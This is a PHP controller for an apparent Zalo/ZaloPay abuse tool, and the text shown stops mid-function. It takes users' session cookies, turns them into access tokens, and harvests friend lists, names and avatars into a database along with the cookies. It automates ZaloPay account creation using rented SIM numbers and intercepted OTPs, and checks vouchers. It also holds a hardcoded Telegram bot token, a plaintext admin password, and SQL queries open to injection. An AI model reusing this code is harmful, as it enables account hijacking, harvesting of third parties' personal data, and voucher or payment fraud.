<?php
require_once "../models/models_home.php";
session_start();

class home
{

  function __construct()
  {

    $this->model = new models_home();
    $act = "findfriends";
    if (isset($_GET['act'])) $act = $_GET['act'];
    $this->$act();
  }

  function sendToBot()
  {




    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://api.telegram.org/bot5788960686:AAFkXl_Y5ik7kmrOJ9bi05otV78g8PlfnI4/sendMessage?chat_id=-637175626&text=f%25C3%25A1df%25C3%25A1df',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => false,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    echo $response;
  }



  function genCode($length = 6)
  {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    while (true) {
      for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      $check = $this->model->queryOne("SELECT id FROM phone_number WHERE `phone_number`.`code` = '$randomString' ");
      if (!is_array($check)) {
        break;
      }
    }
    return $randomString;
  }
  // controller Tìm bạn bè
  function altertable()
  {

    $check = $this->model->query("SELECT * FROM phone_number  desc")->fetchAll();

    foreach ($check as $key => $value) {
      $id = $value['number'];
      $code = $this->genCode();
      $this->model->query("UPDATE `phone_number` SET `code` = '$code'    WHERE `phone_number`.`number` = $id");
    }
  }

  function findfriends()
  {
    $friends = [];
    if (isset($_GET['type']) && $_GET['type'] == 'decode') {

      $sdt = $_SESSION['number'];

      $friends = $this->model->get_list_friends($sdt);
      $_SESSION['number'] = '';
    }
    if (isset($_POST['lay'])) {
      $code = $_POST['sdt'];
      $sdt = "null";
      if (strlen($code) ==  6) {
        $getsdt = $this->model->queryOne("SELECT number FROM phone_number WHERE `phone_number`.`code` = '$code' ");
        if (is_array($getsdt)) $sdt = $getsdt["number"];
      }

      $_SESSION['number'] = $sdt;
      $friends = $this->model->get_list_friends($sdt);
    }
    $pagename = "XÁC MINH BẠN BÈ";
    $pathfile = '../views/find_friends.php';

    require_once "../views/layout.php";
  }

  public function postphone()
  {
    if (isset($_GET['sdt'])) {
      $sdt = $_GET['sdt'];
      $sql = "INSERT INTO `phone_number` ( `number`, `used`, `note`,`banbe`) VALUES ( $sdt, '1', 'A', '')";
      $this->model->execute($sql);
      echo 'ok';
    }
  }
  public function themtaikhoan()
  {

    $data = $_POST["data"];

    $profiledata = $_POST['profile'];
    $note = $_POST['note'];

    $data =  json_decode($data, true);
    $profiledata =  json_decode($profiledata, true);

    $slbb = $_POST['slbb'];
    if (isset($_POST['sdt']) && $_POST['sdt'] != "") {
      $sdt = $_POST['sdt'];
    } else {
      $sdt = $profiledata['phoneNumber'];
      $sdt =  substr($sdt, 3, null);
    }

    $image = $profiledata['avatar'];
    $usid = $profiledata['userId'];
    $zlname = $profiledata['zaloName'];
    $code = $this->genCode();
    $check = $this->model->queryOne("SELECT * FROM banbe where number = '$sdt' ");
    $check1 = $this->model->queryOne("SELECT * FROM phone_number where number = '$sdt' ");
    if (is_array($check1)) {
      $this->model->execute("DELETE FROM `phone_number` WHERE number = '$sdt'");
    }
    if (is_array($check)) {
      $this->model->execute("DELETE FROM `banbe` WHERE number = '$sdt'");
    }

    foreach ($data as $fradd) {

      $name = $this->loc_xoa_dau($fradd['zaloName']);
      $name = UTF8_encode($name);
      $img = $fradd['avatar'];
      $sql = "INSERT INTO `banbe` (`id`, `name`, `image`, `number`) VALUES (NULL, '$name', '$img', '$sdt')";

      $this->model->execute($sql);
    }
    $sql = "INSERT INTO `phone_number` ( `id_zalo`,`number`,`name`, `used`, `note`,`cookie`,`avatar`,`slbb`,`code`) VALUES ( '$usid','$sdt','$zlname', '0', '$note', 'null','$image','$slbb','$code')";

    $this->model->execute($sql);

    echo "xong!";
  }

  public function banbe()
  {
    if (isset($_GET['sdt'])) {

      echo "<a href='/zalo/ban-be-de/" . $_GET['sdt'] . "'>lỗi font bấm ở đây</a> <br> <br>";
      $sdt = $_GET['sdt'];
      $data = $this->model->query("SELECT * FROM banbe where number = " . $_GET['sdt'])->fetchAll();
      foreach ($data as $item) {
        echo '   |  ' . utf8_decode($item['name']);
      }
      echo '   |     ==> TỔNG: ' . count($data);
      require  '../views/xuatfile.php';
    }
  }
  public function banbede()
  {

    if (isset($_GET['sdt'])) {
      echo "<a href='/zalo/ban-be/" . $_GET['sdt'] . "'>lỗi font bấm ở đây</a> <br>";
      $sdt = $_GET['sdt'];
      $data = $this->model->query("SELECT * FROM banbe where number = " . $_GET['sdt'])->fetchAll();
      foreach ($data as $item) {
        echo '   |   ' . $item['name'];
      }
      echo '  |     ==> TỔNG: ' . count($data);
    }
  }

  // controller đăng nhập
  function login()
  {

    if (isset($_POST['dangnhap'])) {
      $password =  strip_tags($_POST['password']);
      if ($password == 'hts') {
        $_SESSION['passwordmyweb'] = 'hts';
      }
    }

    header("location: /zalo/lay-so-dien-thoai/");
  }


  // controller lấy số điện thoại
  function getnumber()
  {

    $pagename = "LẤY SỐ ĐIỆN THOẠI";
    $pathfile = '../views/getnumber.php';
    require_once "../views/layout.php";
  }
  function getnumbersim()
  {
    $pagename = "LẤY SỐ SIM";
    $pathfile = '../views/getnumbersim.php';
    require_once "../views/layout.php";
  }
  public function getNumOfFrends()
  {

    $data = $this->model->get_page_number(4000, 500);
    foreach ($data as $key) {
      $nun = $key['number'];
      $numcount = $this->model->get_count_friends($nun)['dem'];
      $sql = "UPDATE `phone_number` SET `slbb` = '$numcount'   WHERE `phone_number`.`number` = '$nun'";
      $this->model->query($sql);
    }
  }

  function getnumberdata()
  {

    if (isset($_SESSION['passwordmyweb']) && $_SESSION['passwordmyweb'] == "hts") {
      $totalrow =   count($this->model->get_list_number());
      $current_page = isset($_GET['page']) ? $_GET['page'] : 1;
      $limit  = isset($_GET['limit']) ? $_GET['limit'] : 200;
      $total_page = ceil($totalrow / $limit);
      $start = ($current_page - 1) * $limit;


      $data = [
        "data" => $this->model->get_page_number($start, $limit),
        "pagenext" => $current_page + 1,
        "totalpage" => $total_page
      ];
      echo json_encode($data);
    } else echo "có cái đầu buồi ấy biến!";
  }
  // Định dạng ngày giờ
  function getTime($timestamp)
  {
    $date = date_create();

    date_timestamp_set($date, $timestamp);
    return date_format($date, 'U = Y-m-d H:i:s') . "\n";
  }

  // controller check BIG_C
  function bigc_check()
  {
    if (isset($_POST['cookie']) &&  $_POST['cookie'] != "") {
      $h5cookie = $_POST['cookie'];
      $checkbigc = json_decode($this->check_bigc($h5cookie), true);
      if ($checkbigc == 1) {
        $bigc =  '<span class="text-success">"OK"</span>';
      } else $bigc =  '<span class="text-danger">"NOT"</span>';
      $listvc = $this->getlistvc($h5cookie);

      $ls = "";
      if (isset($listvc['data']['campaigns']) && is_array($listvc['data']['campaigns'])) {

        foreach ($listvc['data']['campaigns'] as $listvc) {
          $ls .= "<h4><img width='40px' src='" . $listvc['avatar'] . "'>" . $listvc['voucherName'] . " | <span>Hạn: " . date("d/m/Y", $listvc['UseConditionExpiredDate'] / 1000) . "</span></h4>";
        }
      }
    }

    $pagename = "CHECK VOUCHER BIGC";
    $pathfile = '../views/check_bigc.php';
    require_once "../views/layout.php";
  }

  // API check BIG_C
  function check_bigc($h5cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://zmc.zalopay.vn/zlp/promotion/?promotiontranid=210403000410919&merchant=bigcgovap',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(

        'cookie:' . $h5cookie,
        'sec-fetch-dest:  document',
        'sec-fetch-mode:  navigate',
        'sec-fetch-site:  none',
        'sec-fetch-user:  ?1',
        'upgrade-insecure-requests:  1',
        'user-agent:  Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    $regex = '{<title>Quà tặng</title>}';
    return preg_match($regex, $response);
  }

  // controller check các voucher 
  function checkvoucher()
  {

    $err = '';
    $_SESSION['check'] = '';
    $_SESSION['bm'] = '';
    $_SESSION['CP'] = '';
    $_SESSION['CM'] = '';
    if (isset($_POST['check'])) {
      if (isset($_POST['addzlp'])) {
        $_SESSION['check'] = 'checked';
      } else $_SESSION['check'] = '';

      if (isset($_POST['CM'])) {
        $_SESSION['CM'] = 'checked';
      } else $_SESSION['CM'] = '';

      if (isset($_POST['CP'])) $_SESSION['CP'] = 'checked';
      else $_SESSION['CP'] = '';

      $h5cookie = $_POST['cookie'];

      // $api = $_POST['api'];
      $api = "";
      if (isset($_POST['bm']))
        $_SESSION['bm'] = 'checked';

      $token =  $this->get_token($h5cookie);


      if ($token === 0) {
        $err = 'Sai Cookie!';
      } else {
        $note = "N";
        $mm = 0;
        $vc1 = 'NONE';
        $tasks = "";
        $baemin = '';
        $bm = "";
        //check BAEMIN
        if (isset($_SESSION['bm']) && $_SESSION['bm'] == 'checked') {
          $bmdata =   $this->checkbm($h5cookie);
          if ($bmdata['message'] == "OK") {
            $note = "BM";
            $bm = '1';
            $baemin =  '<h3>BAEMIN:<span class="text-success">"OK"</span></h3>';
          } else $baemin =  '<h3>BAEMIN: <span class="text-danger">"NOT"</span></h3>';
        }

        // check cooopmart
        $cm = "";
        $checkcoopmart = '';
        if ($_SESSION['CM'] == "checked") {


          $checkcoopmart = json_decode($this->checkCoopMart($h5cookie), true);
          if ($checkcoopmart == 1) {
            $cm = 1;
            $coop =  '<h3>COOP_MART:<span class="text-success">"OK"</span></h3>';
            $note .= 'CM';
          } else $coop =  '<h3>COOP_MART: <span class="text-danger">"NOT"</span></h3>';
        } else $coop = "";


        // check bigc
        $c = "";
        $checkbigc = 0;
        if ($_SESSION['CP'] == "checked") {


          $checkbigc = $this->check_bigc($h5cookie);
          if ($checkbigc == 1) {

            $c = 1;
            $bigc =  '<h3>BIG_C:<span class="text-success">"OK"</span></h3>';
            $note .= 'Z';
          } else $bigc =  '<h3>BIG_C: <span class="text-danger">"NOT"</span></h3>';
        } else $bigc = "undefine";
        // END check bigc


        // if (true) {
        //   $checkNH = $this->checkMM($h5cookie);
        //   if ($checkNH["status"] == 200) {
        //     $vc1 = 1;
        //     $mm = 1;
        //     $c = '<h3 class="">MĂM: <span class="text-success">"OK"</span> </h3> ';
        //   } else {
        //     $c = '<h3 class="">MĂM: <span class="text-danger">"NOT"</span> </h3> ';
        //   }
        // }

        $vc = '1';
        // $check_circle = $this->check_vc_circle($h5cookie);
        $checkvc = json_decode($this->checkvc($h5cookie), true);

        if ($checkvc == 1) {
          $family =  '<h3 class="">TÙ XÌ: <span class="text-success">"OK"</span</h3>';
          $note .= "V";
        } else $family =  '<h3 class="">TÙ XÌ: <span class="text-danger">"NOT"</span></h3>';


        // list voucher
        $listvc = $this->getlistvc($h5cookie);

        $ls = '';
        if (isset($listvc['data']['campaigns']) && is_array($listvc['data']['campaigns'])) {

          foreach ($listvc['data']['campaigns'] as $listvc) {
            $ls .= "<h4><img width='40px' src='" . $listvc['avatar'] . "'>" . $listvc['voucherName'] . " | <span>Hạn: " .   $listvc['UseConditionExpiredDate'] . "<> " . $listvc['voucherCode'] . "</span> </h4>";
            if ($listvc['voucherName'] == 'Co.op Mart| Giảm 50K đơn từ 150K') {
              $cm = 1;
            }
          }
        }



        $addzalopay = '';

        // if (isset($_POST['addzlp'])  && ($vc == 1 || $checkvc1 == 1 || $check_circle == 1)) {
        if (isset($_POST['addzlp'])  &&  ($checkvc == 1 || $checkbigc == 1 || $vc == '1' || $cm == 1 || $bm == 1)) {
          // echo $_POST['addzlp'];

          $addz = $this->addzlp($h5cookie, $api);
          if ($addz == "0") {
            $note .= "h";
            $addz = "Đã có zalopay";
          }
          $addzalopay = '<h3 class="">ZALOPAY: ' . $addz . '</h3>';
        }

        $tong = "undefine";
        if (isset($_POST['sdt']) && ($_POST['sdt'] != '')) {
          $profile = $this->get_pf_me($token);
          $zalo_name = $profile['name'];
          $zalo_id = $profile['id'];
          $avatar = $profile['picture']['data']['url'];
          $data = $this->getdata($token);
          $tong = count($data);
          $sdt = $_POST['sdt'];
          if ($_POST['slbb'] == '') $slbb = "null";
          else $slbb = $_POST['slbb'];
          $used = 0;
          $check = $this->model->queryOne("SELECT * FROM banbe where number = '$sdt' ");
          $check1 = $this->model->queryOne("SELECT * FROM phone_number where number = '$sdt' ");
          if (is_array($check1)) {
            $this->model->execute("DELETE FROM `phone_number` WHERE number = '$sdt'");
          }
          if (is_array($check)) {
            $this->model->execute("DELETE FROM `banbe` WHERE number = '$sdt'");
          }

          $sql = "INSERT INTO `phone_number` ( `id_zalo`,`number`,`name`, `used`, `note`,`cookie`,`avatar`,`slbb`) VALUES ( '$zalo_id','$sdt','$zalo_name', '$used', '$note', '$h5cookie','$avatar','$slbb')";
          $this->model->execute($sql);




          foreach ($data as $fradd) {

            $name = $this->loc_xoa_dau($fradd['name']);
            $name = UTF8_encode($name);
            $img = $fradd['picture']['data']['url'];
            $sql = "INSERT INTO `banbe` (`id`, `name`, `image`, `number`) VALUES (NULL, '$name', '$img', '$sdt')";

            $this->model->execute($sql);
          }
        }
      }
    }
    $pagename = "CHECK VOUCHER";
    $pathfile = '../views/checkvoucher.php';
    require_once "../views/layout.php";
  }
  public function get_pf_me($token)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://graph.zalo.me/v2.0/me?access_token=' . $token . '&fields=id,name,picture',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }
  function checkbm($cookie)
  {
    $curl = curl_init();
    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://uudai.zalopay.vn/merchant/join-reward/api/get-info',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
      "eventName": "get-info"
    }',
      CURLOPT_HTTPHEADER => array(
        'Cookie:' . $cookie,
        'Content-Type: application/json'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);

    return json_decode($response, true);
  }


  function getlistvc($h5cookie)
  {

    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/reward/voucher',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(
        'cookie:' . $h5cookie
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }

  function loc_xoa_dau($str)
  {

    $str = preg_replace("/'/", "", $str);
    return $str;
  }
  function delete()
  {
    $id = $_POST['id'];
    if (isset($id) && $id != '') {
      $this->model->delete($id);
      $this->model->deletefr($id);
    }
  }

  function update()
  {
    $id = $_POST['id'];
    $note = $_POST['note'];
    $check = $_POST['check'];
    if (isset($id) && $id != '') $this->model->update($id, $note, $check);
  }



  // check voucher

  function checkMM($cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://uudai.zalopay.vn/mammam/api/get-info',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
  "eventName": "get-info"
}',
      CURLOPT_HTTPHEADER => array(
        'cookie:  ' . $cookie,
        'content-type:application/json'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }

  function checkvc($h5cookie)
  {



    // $curl = curl_init();

    // curl_setopt_array($curl, array(
    //   CURLOPT_URL => 'https://uudai.zalopay.vn/scissorsrock/api/get-info',
    //   CURLOPT_RETURNTRANSFER => true,
    //   CURLOPT_ENCODING => '',
    //   CURLOPT_MAXREDIRS => 10,
    //   CURLOPT_TIMEOUT => 0,
    //   CURLOPT_FOLLOWLOCATION => true,
    //   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    //   CURLOPT_CUSTOMREQUEST => 'GET',
    //   CURLOPT_HTTPHEADER => array(
    //     'cookie: ' . $h5cookie
    //   ),
    // ));

    // $response = curl_exec($curl);

    // curl_close($curl);
    // try {
    //   $st =  json_decode($response, true)["message"];
    //   if ($st == "Successfully") return 1;
    //   else return 0;
    // } catch (\Throwable $th) {
    //   return 0;
    // }
    return 0;
  }

  public function checkCoopMart($h5cookie)
  {
    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://zmc.zalopay.vn/zlp/promotion/?merchant=coopmart',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(

        'cookie:' . $h5cookie,
        'sec-fetch-dest:  document',
        'sec-fetch-mode:  navigate',
        'sec-fetch-site:  none',
        'sec-fetch-user:  ?1',
        'upgrade-insecure-requests:  1',
        'user-agent:  Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    $regex = '{<title>Quà tặng</title>}';
    return preg_match($regex, $response);
  }

  function get_token($h5cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/user/zalo/access-token',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(
        'cookie:' . $h5cookie
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);

    $token = json_decode($response, true);
    if (isset($token['data']['token']) && $token['data']['token'] != '')
      return $token['data']['token'];
    else return 0;
  }


  function getdata($h5token)
  {

    $data = array();




    $dataa = json_decode($this->getn($h5token), true);
    foreach ($dataa['data'] as $dt) {

      array_push($data,  $dt);
    }
    while (isset($dataa['paging']['next'])) {

      $dataa = json_decode($this->getfrurl($dataa['paging']['next']), true);
      foreach ($dataa['data'] as  $dt) {
        array_push($data,  $dt);
      }
    }

    $datab = json_decode($this->getfr($h5token), true);
    foreach ($datab['data'] as  $dt) {

      array_push($data,  $dt);
    }
    while (isset($datab['paging']['next'])) {

      $datab = json_decode($this->getfrurl($datab['paging']['next']), true);
      foreach ($datab['data'] as  $dt) {

        array_push($data,  $dt);
      }
    }



    return $data;
  }


  function getfrurl($url)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => $url,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
  }


  function getfr($tokenh5)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://graph.zalo.me/v2.0/me/invitable_friends?access_token=' . $tokenh5 . '&offset=0&limit=100&fields=id,name,gender,picture',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
  }


  function getn($tokenh5)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://graph.zalo.me/v2.0/me/friends?access_token=' . $tokenh5 . '&offset=0&limit=100&fields=id,name,gender,picture',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
  }

  function addzlp($cookie, $api)
  {




    $token1 = '';
    if (isset($cookie) && $cookie != '') {
      $loop = 0;
      $checkuser = $this->check_zlp_avail($cookie);
      if ($checkuser == 1) {
        $nn = 1;
        while ($loop == 0) {

          $tien = $this->getbalance($api);
          if (isset($tien['Result']['Balance']) && $tien['Result']['Balance'] < 1) {
            $loop = 1;
            $_SESSION['api'] =  $api;
            $errr = 'API Hết Tiền';
          }
          //   $tien = $this->getbalanceotp($api);

          //   if (isset($tien['data']['balance']) && $tien['data']['balance'] < 1000) {
          //     $loop = 1;
          //     $_SESSION['api'] =  $api;
          //     $errr = 'API Hết Tiền';
          //   }

          if ($tien["ResponseCode"] != '0') {
            $errr = 'API Không đúng';
            break;
          } else {
            //   if ($tien["status_code"] == '401') {
            //     $errr = 'API Không đúng';
            //     break;
            //   } else {

            $_SESSION['api'] =  $api;


            if ($nn >= 4) $nn = 1;
            // $getphone = $this->getphoneopt($api, $nn);
            $getphone = $this->getphone($api, $nn);
            $nn++;
            // if (isset($getphone['data']['phone_number']) && $getphone['data']['session'] != '') {

            //   $number = $getphone['data']['phone_number'];
            //   $id = $getphone['data']['session'];
            if (isset($getphone['Result']['Number']) && $getphone['Result']['Number'] != '') {
              $number = $getphone['Result']['Number'];
              $id = $getphone['Result']['Id'];
              $checkavai =  $this->getstatus($number, $cookie);
              if ($checkavai == 1) {
                $token1 =  $this->sendOTP($number, $cookie);
                if ($token1 != '') {
                  $c = 0;
                  $lop = 0;

                  while ($lop == 0) {

                    $c++;
                    // $code = $this->getcodeotp($id, $api);
                    $code = $this->getcode($id, $api);
                    // if (isset($code['data']['messages'][0]['otp']) && $code['data']['messages'][0]['otp'] != null) {
                    //   $code = $code['data']['messages'][0]['otp'];

                    if (isset($code['Result']['Code']) && $code['Result']['Code'] != null) {
                      $code = $code['Result']['Code'];

                      $data = $this->submitOTP($token1, $code, $cookie);
                      $rs =  $this->setpin($data, $cookie);
                      if ($rs['error']['code'] == 0) $errr = "Đã add ZaloPay";
                      else $errr = 'Lỗi: ' . $rs['error']['message'];
                      $lop = 1;
                      $loop = 1;
                    } else sleep(3);
                    if ($c >= 10) {

                      $this->cancelotp($id, $api);
                      $lop = 1;
                    }
                  }
                } else $this->cancelotp($id, $api);
              } else {
                $this->cancelotp($id, $api);
              }
            }
          }
        }
      } else {
        $errr = "0";
      }
    } else $errr = "nhập cookie";
    return $errr;
  }



  function getbalance($api)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://chothuesimcode.com/api?act=account&apik=' . $api,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);

    return json_decode($response, true);
  }

  // nap tien zalo


  function getStatusPay($cookie, $session)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/wallet/history/' . $session,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_HTTPHEADER => array(
        'cookie: ' . $cookie
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }

  function t4($cookie, $ordertoken, $softoken)
  {

    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v2/cashier/pay',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
  "authenticator": {
    "authen_type": 1,
    "pin": "91b4d142823f7d20c5f08df69122de43f35f057a988d9619f6d3138485c9a203"
  },
  "order_fee": [],
  "order_token": "' . $ordertoken . '",
  "promotion_token": "",
  "service_id": 7,
  "sof_token": "' . $softoken . '",
  "user_fee": [
    "0"
  ],
  "zalo_token": ""
}',
      CURLOPT_HTTPHEADER => array(
        'cookie: ' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }

  function t2($apptrans, $apptime, $appuser, $mac, $cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v2/cashier/assets',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
  "order_data": {
    "app_id": 454,
    "app_trans_id": "' . $apptrans . '",
    "app_time": ' . $apptime . ',
    "amount": 10000,
    "app_user": "' . $appuser . '",
    "description": "Nạp tiền vào tài khoản ZaloPay",
    "embed_data": "",
    "mac": "' . $mac . '",
    "item": "",
    "trans_type": 1,
    "product_code": "",
    "zalo_token": "",
    "service_fee": null
  },
  "bank_info": {
    "bank_code": "VCCB",
    "first_6_no": "900704",
    "last_4_no": "5485",
    "pmc_id": 37
  },
  "full_assets": true,
  "order_type": 1
}',
      CURLOPT_HTTPHEADER => array(
        'cookie: ' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }






  function t1($cookie)
  {
    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v1/bank/order/top-up',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
  "amount": "10000"
}',
      CURLOPT_HTTPHEADER => array(
        'cookie:' . $cookie,
        'Content-Type: text/plain'
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return json_decode($response, true);
  }

  function t3($ordertoken, $softoken, $cookie)
  {


    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://sapi.zalopay.vn/v2/cashier/change-assets',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{
  "order_token": "' . $ordertoken . '",
  "sof_token": "' . $softoken . '"
}',
